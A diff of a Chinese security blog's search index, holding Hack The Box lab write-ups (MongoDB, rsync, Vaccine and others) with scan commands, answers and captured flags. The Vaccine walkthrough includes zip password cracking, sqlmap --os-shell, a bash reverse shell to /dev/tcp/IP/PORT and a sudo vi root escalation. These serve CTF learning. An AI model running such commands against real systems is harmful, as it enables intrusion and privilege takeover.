+<h5 id="八、用于以易于阅读的格式转储名为-flag-的集合中所有文档的内容的命令是什么？"><a href="#八、用于以易于阅读的格式转储名为-flag-的集合中所有文档的内容的命令是什么？" class="headerlink" title="八、用于以易于阅读的格式转储名为 flag 的集合中所有文档的内容的命令是什么？"></a>八、用于以易于阅读的格式转储名为 flag 的集合中所有文档的内容的命令是什么？</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#链接mongoDB</span><br><span class="line">mongo IP</span><br><span class="line">#切换到sensitive_information数据库</span><br><span class="line">use sensitive_information</span><br><span class="line">#列出数据库中的集合</span><br><span class="line"><span class="keyword">show</span> collections</span><br><span class="line">#列出flag集合的内容</span><br><span class="line">db.flag.find().pretty()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/11/VQaAGWXT8FbNLCZ.png" alt="image-20230309233854675"></p>
+<h5 id="九、提交flag"><a href="#九、提交flag" class="headerlink" title="九、提交flag"></a>九、提交flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1b6e6fb359e7c40241b6d431427ba6ea</span><br></pre></td></tr></table></figure>
+
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
+<li><p>MongoDB数据库的操作指令</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#列出所有数据库</span><br><span class="line"><span class="keyword">show</span> dbs</span><br><span class="line">#使用特定数据库</span><br><span class="line">use DBName</span><br><span class="line">#列出所有集合</span><br><span class="line"><span class="keyword">show</span> collections</span><br><span class="line">#展示集合中的数据</span><br><span class="line">db.COLname.find().pretty</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>HTB</category>
+      </categories>
+      <tags>
+        <tag>HTB-Mongod</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Funnel</title>
-    <url>/2023/07/06/HTB-PennyWorth/</url>
+    <url>/HTB-PennyWorth.html</url>
     <content><![CDATA[<h5 id="一、首字母缩略词-CVE-代表什么？"><a href="#一、首字母缩略词-CVE-代表什么？" class="headerlink" title="一、首字母缩略词 CVE 代表什么？"></a>一、首字母缩略词 CVE 代表什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Common Vulnerabilities and Exposures</span><br></pre></td></tr></table></figure>
 
 <h5 id="二、在网络安全中，CIA指的是什么？"><a href="#二、在网络安全中，CIA指的是什么？" class="headerlink" title="二、在网络安全中，CIA指的是什么？"></a>二、在网络安全中，CIA指的是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#信息安全三要素，机密性，完整性，可用性</span><br><span class="line">Confidentiality, Integrity, Availability</span><br></pre></td></tr></table></figure>
@@ -714,7 +714,7 @@
   </entry>
   <entry>
     <title>HTB-Pilgrimage</title>
-    <url>/2023/07/06/HTB-Pilgrimage/</url>
+    <url>/HTB-Pilgrimage.html</url>
     <content><![CDATA[<h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><ul>
 <li><p>端口扫描，熟悉的80，22端口开局</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./rustscan -a 10.129.160.210 -r 0-65535 --ulimit 5000</span><br></pre></td></tr></table></figure>
@@ -858,7 +858,7 @@
   </entry>
   <entry>
     <title>HTB-Preignition</title>
-    <url>/2023/07/06/HTB-Preignition/</url>
+    <url>/HTB-Preignition.html</url>
     <content><![CDATA[<h5 id="一、目录暴力破解是一种用于检查-Web-服务器上的大量路径以查找隐藏页面的技术。这是另一个名字？（i）-本地文件包含，（ii）-目录破坏，（iii）-哈希破解。"><a href="#一、目录暴力破解是一种用于检查-Web-服务器上的大量路径以查找隐藏页面的技术。这是另一个名字？（i）-本地文件包含，（ii）-目录破坏，（iii）-哈希破解。" class="headerlink" title="一、目录暴力破解是一种用于检查 Web 服务器上的大量路径以查找隐藏页面的技术。这是另一个名字？（i） 本地文件包含，（ii） 目录破坏，（iii） 哈希破解。"></a>一、目录暴力破解是一种用于检查 Web 服务器上的大量路径以查找隐藏页面的技术。这是另一个名字？（i） 本地文件包含，（ii） 目录破坏，（iii） 哈希破解。</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">目录破坏</span></span><br><span class="line">dirbusting</span><br></pre></td></tr></table></figure>
 
 <h5 id="二、使用什么命令让nmap扫描版本？"><a href="#二、使用什么命令让nmap扫描版本？" class="headerlink" title="二、使用什么命令让nmap扫描版本？"></a>二、使用什么命令让nmap扫描版本？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-sV</span><br></pre></td></tr></table></figure>
@@ -889,8 +889,93 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB-Synced</title>
+    <url>/HTB-Synced.html</url>
+    <content><![CDATA[<h5 id="一、rsync-的默认端口是什么？"><a href="#一、rsync-的默认端口是什么？" class="headerlink" title="一、rsync 的默认端口是什么？"></a>一、rsync 的默认端口是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描IP</span></span><br><span class="line">nmap -sV -sC IP</span><br><span class="line">873</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/23/mwheq6RN75AfHoT.png" alt="image-20230310092009734"></p>
+<h5 id="二、远程主机上打开了多少个-TCP-端口？"><a href="#二、远程主机上打开了多少个-TCP-端口？" class="headerlink" title="二、远程主机上打开了多少个 TCP 端口？"></a>二、远程主机上打开了多少个 TCP 端口？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描IP</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<h5 id="三、远程计算机上的-rsync-使用的协议版本是什么？"><a href="#三、远程计算机上的-rsync-使用的协议版本是什么？" class="headerlink" title="三、远程计算机上的 rsync 使用的协议版本是什么？"></a>三、远程计算机上的 rsync 使用的协议版本是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描IP</span></span><br><span class="line">31</span><br></pre></td></tr></table></figure>
+
+<h5 id="四、Linux-上与-rsync-交互的最常见命令名称是什么？"><a href="#四、Linux-上与-rsync-交互的最常见命令名称是什么？" class="headerlink" title="四、Linux 上与 rsync 交互的最常见命令名称是什么？"></a>四、Linux 上与 rsync 交互的最常见命令名称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rsync</span><br></pre></td></tr></table></figure>
+
+<h5 id="五、您必须向-rsync-传递哪些凭据才能使用匿名身份验证？anonymous-anonymous-anonymous-None-rsync-rsync"><a href="#五、您必须向-rsync-传递哪些凭据才能使用匿名身份验证？anonymous-anonymous-anonymous-None-rsync-rsync" class="headerlink" title="五、您必须向 rsync 传递哪些凭据才能使用匿名身份验证？anonymous:anonymous, anonymous, None, rsync:rsync"></a>五、您必须向 rsync 传递哪些凭据才能使用匿名身份验证？anonymous:anonymous, anonymous, None, rsync:rsync</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">None</span><br></pre></td></tr></table></figure>
+
+<h5 id="六、在-rsync-上仅列出共享和文件的选项是什么？（无需包含前导-–-字符）"><a href="#六、在-rsync-上仅列出共享和文件的选项是什么？（无需包含前导-–-字符）" class="headerlink" title="六、在 rsync 上仅列出共享和文件的选项是什么？（无需包含前导 – 字符）"></a>六、在 rsync 上仅列出共享和文件的选项是什么？（无需包含前导 – 字符）</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在kali中使用rsync -h</span></span><br><span class="line">--list-only</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/23/dBnhesaTFItgMYG.png" alt="image-20230310101117656"></p>
+<h5 id="七、提交falg"><a href="#七、提交falg" class="headerlink" title="七、提交falg"></a>七、提交falg</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用rsync协议远程同步文件至本地/tmp/HTB</span></span><br><span class="line">rsync -r IP::public /tmp/HTB</span><br><span class="line">72eaf5344ebb84908ae543a719830519</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/23/NumfTLEkDJ7QF4O.png" alt="image-20230310101222625"></p>
+<p><img src="https://s2.loli.net/2023/03/23/HA8eEWlKr7JoLUh.png" alt="image-20230310102312294"></p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
+<li><p>rsync的端口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">837</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>rsync未授权访问</p>
+</li>
+<li><p>rsync使用两种协议同步远程文件至本地</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">SSH协议</span></span><br><span class="line">rsync -r IP:/test /tmp/HTB</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rsync协议</span></span><br><span class="line">rsync -r IP::test /tmp/HTB</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>HTB</category>
+      </categories>
+      <tags>
+        <tag>HTB-Synced</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB-Vaccine</title>
+    <url>/HTB-Vaccine.html</url>
+    <content><![CDATA[<h5 id="一、除了SSH和HTTP，这个盒子上还托管着什么其他服务？"><a href="#一、除了SSH和HTTP，这个盒子上还托管着什么其他服务？" class="headerlink" title="一、除了SSH和HTTP，这个盒子上还托管着什么其他服务？"></a>一、除了SSH和HTTP，这个盒子上还托管着什么其他服务？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描</span></span><br><span class="line">nmap -sV -sC 10.129.21.15 </span><br><span class="line">ftp</span><br></pre></td></tr></table></figure>
+
+<h5 id="二、此服务可以配置为允许使用特定用户名的任何密码登录。那个用户名是什么？"><a href="#二、此服务可以配置为允许使用特定用户名的任何密码登录。那个用户名是什么？" class="headerlink" title="二、此服务可以配置为允许使用特定用户名的任何密码登录。那个用户名是什么？"></a>二、此服务可以配置为允许使用特定用户名的任何密码登录。那个用户名是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描</span></span><br><span class="line">nmap -sV -sC 10.129.21.15 </span><br><span class="line">anonymouse</span><br></pre></td></tr></table></figure>
+
+<h5 id="三、通过此服务下载的文件的名称是什么？"><a href="#三、通过此服务下载的文件的名称是什么？" class="headerlink" title="三、通过此服务下载的文件的名称是什么？"></a>三、通过此服务下载的文件的名称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">backup.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/15/QEoD8Bng6zThlFd.png" alt="image-20230221154659612"></p>
+<h5 id="四、-John-The-Ripper-工具集附带什么脚本，并从受密码保护的-zip-存档中生成哈希，其格式允许破解尝试？"><a href="#四、-John-The-Ripper-工具集附带什么脚本，并从受密码保护的-zip-存档中生成哈希，其格式允许破解尝试？" class="headerlink" title="四、 John The Ripper 工具集附带什么脚本，并从受密码保护的 zip 存档中生成哈希，其格式允许破解尝试？"></a>四、 John The Ripper 工具集附带什么脚本，并从受密码保护的 zip 存档中生成哈希，其格式允许破解尝试？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip2john</span><br><span class="line">zip2john xxx.zip&gt;xxx.hash</span><br></pre></td></tr></table></figure>
+
+<h5 id="五、网站上管理员用户的密码是什么？"><a href="#五、网站上管理员用户的密码是什么？" class="headerlink" title="五、网站上管理员用户的密码是什么？"></a>五、网站上管理员用户的密码是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用john破解zip加密</span></span><br><span class="line">zip2john backup.zip &gt;&gt; passwd.hash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">破解密码</span></span><br><span class="line">john passwd.hash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示密码</span></span><br><span class="line">john passwd.hash --show</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在index.php文件找到MD5加密的密码</span></span><br><span class="line">qwerty789</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/15/h4ClLRqiu86fzwH.png" alt="image-20230222102554805"></p>
+<p><img src="https://s2.loli.net/2023/03/15/t1VpoSarbecYnLl.png" alt="image-20230222102640395"></p>
+<h5 id="六、可以将哪些选项传递给sqlmap以尝试通过sql注入来执行命令？"><a href="#六、可以将哪些选项传递给sqlmap以尝试通过sql注入来执行命令？" class="headerlink" title="六、可以将哪些选项传递给sqlmap以尝试通过sql注入来执行命令？"></a>六、可以将哪些选项传递给sqlmap以尝试通过sql注入来执行命令？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--os-shell</span><br></pre></td></tr></table></figure>
+
+<h5 id="七、postgres用户可以使用sudo以root身份运行什么程序？"><a href="#七、postgres用户可以使用sudo以root身份运行什么程序？" class="headerlink" title="七、postgres用户可以使用sudo以root身份运行什么程序？"></a>七、postgres用户可以使用sudo以root身份运行什么程序？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi</span><br></pre></td></tr></table></figure>
+
+<h6 id="八、UserFlag"><a href="#八、UserFlag" class="headerlink" title="八、UserFlag"></a>八、UserFlag</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sqlmap --os-shell获取shell后，反弹shell到kali</span></span><br><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;1&amp;&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用find搜索文件</span></span><br><span class="line">find / type f -name user.txt</span><br><span class="line">cat /var/lib/postgresql/user.txt</span><br></pre></td></tr></table></figure>
+
+<h6 id="九、RootFlag"><a href="#九、RootFlag" class="headerlink" title="九、RootFlag"></a>九、RootFlag</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从GitHub下载python脚本</span></span><br><span class="line">https://github.com/florianges/-HTB-Vaccine_sql_injection</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">复制nc.traditional文件到桌面，修改文件名为nc</span></span><br><span class="line">cp /bin/nc.traditional /home/Desktop/nc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开启python的web服务</span></span><br><span class="line">python3 -m http.server 80</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改sql_injection脚本，并开启nc监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行python脚本，获取shell（接收后不会弹出任何内容，直接执行命令即可）</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用如下命令提升为ttyshell</span></span><br><span class="line">SHELL=/bin/bash script -q /dev/null</span><br><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看/var/www/html/dashboard.php文件，获取postgresql用户密码</span></span><br><span class="line">cat /var/www/html/dashboard.php</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行sudo -l，查看命令权限。输入刚才获取的密码</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编辑/pg_hba.conf文件</span></span><br><span class="line">sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">写入提权命令，回车</span></span><br><span class="line">:!/bin/bash</span><br><span class="line">whoami</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">find寻找root.txt文件</span></span><br><span class="line">find / type f -name root.txt 2&gt;dev/null</span><br><span class="line">cat /root/roo.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/15/tdNITmk73lAF4Sj.png" alt="image-20230222172322409"></p>
+<p><img src="https://s2.loli.net/2023/03/15/Xg14BVmCLWuo5Hs.png" alt="image-20230222172338416"></p>
+<p><img src="https://s2.loli.net/2023/03/15/O3QyERKnWmSUJig.png" alt="image-20230222172522096"></p>
+<p><img src="https://s2.loli.net/2023/03/15/9lHpFg5xtrX2LUq.png" alt="image-20230222173052225"></p>
+<p><img src="https://s2.loli.net/2023/03/15/pHAPnOlmILU6QJE.png" alt="image-20230223111734986"></p>
+<p><img src="https://s2.loli.net/2023/03/15/degQvGHFfmPybzn.png" alt="image-20230223111812736"></p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
+<li><p>John工具破解加密zip</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成<span class="built_in">hash</span>文件</span></span><br><span class="line">zip2john xxx.zip &gt;&gt; passwd.hash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">破解<span class="built_in">hash</span></span></span><br><span class="line">jhon passwd.hash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示密码</span></span><br><span class="line">jhon passwd.hash --show</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>HTB</category>
+      </categories>
+      <tags>
+        <tag>HTB-Vaccine</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Sau</title>
-    <url>/2023/07/14/HTB-Sau/</url>
+    <url>/HTB-Sau.html</url>
     <content><![CDATA[<h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><ul>
 <li><p>Nmap扫描获取端口</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -sS -Pn 10.129.115.1 </span><br></pre></td></tr></table></figure>
@@ -962,47 +1047,8 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB-Synced</title>
-    <url>/2023/07/06/HTB-Synced/</url>
-    <content><![CDATA[<h5 id="一、rsync-的默认端口是什么？"><a href="#一、rsync-的默认端口是什么？" class="headerlink" title="一、rsync 的默认端口是什么？"></a>一、rsync 的默认端口是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描IP</span></span><br><span class="line">nmap -sV -sC IP</span><br><span class="line">873</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/23/mwheq6RN75AfHoT.png" alt="image-20230310092009734"></p>
-<h5 id="二、远程主机上打开了多少个-TCP-端口？"><a href="#二、远程主机上打开了多少个-TCP-端口？" class="headerlink" title="二、远程主机上打开了多少个 TCP 端口？"></a>二、远程主机上打开了多少个 TCP 端口？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描IP</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<h5 id="三、远程计算机上的-rsync-使用的协议版本是什么？"><a href="#三、远程计算机上的-rsync-使用的协议版本是什么？" class="headerlink" title="三、远程计算机上的 rsync 使用的协议版本是什么？"></a>三、远程计算机上的 rsync 使用的协议版本是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描IP</span></span><br><span class="line">31</span><br></pre></td></tr></table></figure>
-
-<h5 id="四、Linux-上与-rsync-交互的最常见命令名称是什么？"><a href="#四、Linux-上与-rsync-交互的最常见命令名称是什么？" class="headerlink" title="四、Linux 上与 rsync 交互的最常见命令名称是什么？"></a>四、Linux 上与 rsync 交互的最常见命令名称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rsync</span><br></pre></td></tr></table></figure>
-
-<h5 id="五、您必须向-rsync-传递哪些凭据才能使用匿名身份验证？anonymous-anonymous-anonymous-None-rsync-rsync"><a href="#五、您必须向-rsync-传递哪些凭据才能使用匿名身份验证？anonymous-anonymous-anonymous-None-rsync-rsync" class="headerlink" title="五、您必须向 rsync 传递哪些凭据才能使用匿名身份验证？anonymous:anonymous, anonymous, None, rsync:rsync"></a>五、您必须向 rsync 传递哪些凭据才能使用匿名身份验证？anonymous:anonymous, anonymous, None, rsync:rsync</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">None</span><br></pre></td></tr></table></figure>
-
-<h5 id="六、在-rsync-上仅列出共享和文件的选项是什么？（无需包含前导-–-字符）"><a href="#六、在-rsync-上仅列出共享和文件的选项是什么？（无需包含前导-–-字符）" class="headerlink" title="六、在 rsync 上仅列出共享和文件的选项是什么？（无需包含前导 – 字符）"></a>六、在 rsync 上仅列出共享和文件的选项是什么？（无需包含前导 – 字符）</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在kali中使用rsync -h</span></span><br><span class="line">--list-only</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/23/dBnhesaTFItgMYG.png" alt="image-20230310101117656"></p>
-<h5 id="七、提交falg"><a href="#七、提交falg" class="headerlink" title="七、提交falg"></a>七、提交falg</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用rsync协议远程同步文件至本地/tmp/HTB</span></span><br><span class="line">rsync -r IP::public /tmp/HTB</span><br><span class="line">72eaf5344ebb84908ae543a719830519</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/23/NumfTLEkDJ7QF4O.png" alt="image-20230310101222625"></p>
-<p><img src="https://s2.loli.net/2023/03/23/HA8eEWlKr7JoLUh.png" alt="image-20230310102312294"></p>
-<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
-<li><p>rsync的端口</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">837</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>rsync未授权访问</p>
-</li>
-<li><p>rsync使用两种协议同步远程文件至本地</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">SSH协议</span></span><br><span class="line">rsync -r IP:/test /tmp/HTB</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rsync协议</span></span><br><span class="line">rsync -r IP::test /tmp/HTB</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>HTB</category>
-      </categories>
-      <tags>
-        <tag>HTB-Synced</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB-Hactics</title>
-    <url>/2023/07/06/HTB-Tactics/</url>
+    <url>/HTB-Tactics.html</url>
     <content><![CDATA[<h5 id="一、当我们的-ping-ICMP-数据包被-Windows-防火墙阻止时，我们可以使用哪个-Nmap-参数来枚举机器？"><a href="#一、当我们的-ping-ICMP-数据包被-Windows-防火墙阻止时，我们可以使用哪个-Nmap-参数来枚举机器？" class="headerlink" title="一、当我们的 ping ICMP 数据包被 Windows 防火墙阻止时，我们可以使用哪个 Nmap 参数来枚举机器？"></a>一、当我们的 ping ICMP 数据包被 Windows 防火墙阻止时，我们可以使用哪个 Nmap 参数来枚举机器？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-PN</span><br></pre></td></tr></table></figure>
 
 <h5 id="二、3-个字母的首字母缩略词-SMB-代表什么？"><a href="#二、3-个字母的首字母缩略词-SMB-代表什么？" class="headerlink" title="二、3 个字母的首字母缩略词 SMB 代表什么？"></a>二、3 个字母的首字母缩略词 SMB 代表什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server message block</span><br></pre></td></tr></table></figure>
@@ -1041,52 +1087,6 @@
       </categories>
       <tags>
         <tag>HTB-Hactics</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB-Vaccine</title>
-    <url>/2023/07/06/HTB-Vaccine/</url>
-    <content><![CDATA[<h5 id="一、除了SSH和HTTP，这个盒子上还托管着什么其他服务？"><a href="#一、除了SSH和HTTP，这个盒子上还托管着什么其他服务？" class="headerlink" title="一、除了SSH和HTTP，这个盒子上还托管着什么其他服务？"></a>一、除了SSH和HTTP，这个盒子上还托管着什么其他服务？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描</span></span><br><span class="line">nmap -sV -sC 10.129.21.15 </span><br><span class="line">ftp</span><br></pre></td></tr></table></figure>
-
-<h5 id="二、此服务可以配置为允许使用特定用户名的任何密码登录。那个用户名是什么？"><a href="#二、此服务可以配置为允许使用特定用户名的任何密码登录。那个用户名是什么？" class="headerlink" title="二、此服务可以配置为允许使用特定用户名的任何密码登录。那个用户名是什么？"></a>二、此服务可以配置为允许使用特定用户名的任何密码登录。那个用户名是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描</span></span><br><span class="line">nmap -sV -sC 10.129.21.15 </span><br><span class="line">anonymouse</span><br></pre></td></tr></table></figure>
-
-<h5 id="三、通过此服务下载的文件的名称是什么？"><a href="#三、通过此服务下载的文件的名称是什么？" class="headerlink" title="三、通过此服务下载的文件的名称是什么？"></a>三、通过此服务下载的文件的名称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">backup.zip</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/15/QEoD8Bng6zThlFd.png" alt="image-20230221154659612"></p>
-<h5 id="四、-John-The-Ripper-工具集附带什么脚本，并从受密码保护的-zip-存档中生成哈希，其格式允许破解尝试？"><a href="#四、-John-The-Ripper-工具集附带什么脚本，并从受密码保护的-zip-存档中生成哈希，其格式允许破解尝试？" class="headerlink" title="四、 John The Ripper 工具集附带什么脚本，并从受密码保护的 zip 存档中生成哈希，其格式允许破解尝试？"></a>四、 John The Ripper 工具集附带什么脚本，并从受密码保护的 zip 存档中生成哈希，其格式允许破解尝试？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip2john</span><br><span class="line">zip2john xxx.zip&gt;xxx.hash</span><br></pre></td></tr></table></figure>
-
-<h5 id="五、网站上管理员用户的密码是什么？"><a href="#五、网站上管理员用户的密码是什么？" class="headerlink" title="五、网站上管理员用户的密码是什么？"></a>五、网站上管理员用户的密码是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用john破解zip加密</span></span><br><span class="line">zip2john backup.zip &gt;&gt; passwd.hash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">破解密码</span></span><br><span class="line">john passwd.hash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示密码</span></span><br><span class="line">john passwd.hash --show</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在index.php文件找到MD5加密的密码</span></span><br><span class="line">qwerty789</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/15/h4ClLRqiu86fzwH.png" alt="image-20230222102554805"></p>
-<p><img src="https://s2.loli.net/2023/03/15/t1VpoSarbecYnLl.png" alt="image-20230222102640395"></p>
-<h5 id="六、可以将哪些选项传递给sqlmap以尝试通过sql注入来执行命令？"><a href="#六、可以将哪些选项传递给sqlmap以尝试通过sql注入来执行命令？" class="headerlink" title="六、可以将哪些选项传递给sqlmap以尝试通过sql注入来执行命令？"></a>六、可以将哪些选项传递给sqlmap以尝试通过sql注入来执行命令？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--os-shell</span><br></pre></td></tr></table></figure>
-
-<h5 id="七、postgres用户可以使用sudo以root身份运行什么程序？"><a href="#七、postgres用户可以使用sudo以root身份运行什么程序？" class="headerlink" title="七、postgres用户可以使用sudo以root身份运行什么程序？"></a>七、postgres用户可以使用sudo以root身份运行什么程序？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi</span><br></pre></td></tr></table></figure>
-
-<h6 id="八、UserFlag"><a href="#八、UserFlag" class="headerlink" title="八、UserFlag"></a>八、UserFlag</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sqlmap --os-shell获取shell后，反弹shell到kali</span></span><br><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;1&amp;&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用find搜索文件</span></span><br><span class="line">find / type f -name user.txt</span><br><span class="line">cat /var/lib/postgresql/user.txt</span><br></pre></td></tr></table></figure>
-
